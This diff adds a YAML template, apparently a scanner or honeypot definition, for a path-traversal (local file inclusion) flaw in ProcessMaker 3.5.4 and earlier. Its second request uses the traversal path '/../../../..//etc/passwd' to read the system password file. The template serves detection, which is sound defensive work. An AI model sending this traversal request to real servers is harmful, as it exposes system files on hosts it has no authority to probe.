@@ -1,0 +1,35 @@
+id: processmaker-lfi
+info:
+  name: ProcessMaker <=3.5.4 - Local File Inclusion
+  author: KrE80r
+  description: ProcessMaker 3.5.4 and prior is vulnerable to local file inclusion.
+  severity: high
+  reference:
+  - https://www.exploit-db.com/exploits/50229
+  - https://www.processmaker.com
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 2
+  tags: processmaker,lfi,edb
+traps:
+- request:
+    method: GET
+    path: ''
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ProcessMakerprocessmaker_login.png
+- request:
+    method: GET
+    path: /../../../..//etc/passwd
+    headers: {}
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: 'root:.*:0:0:'
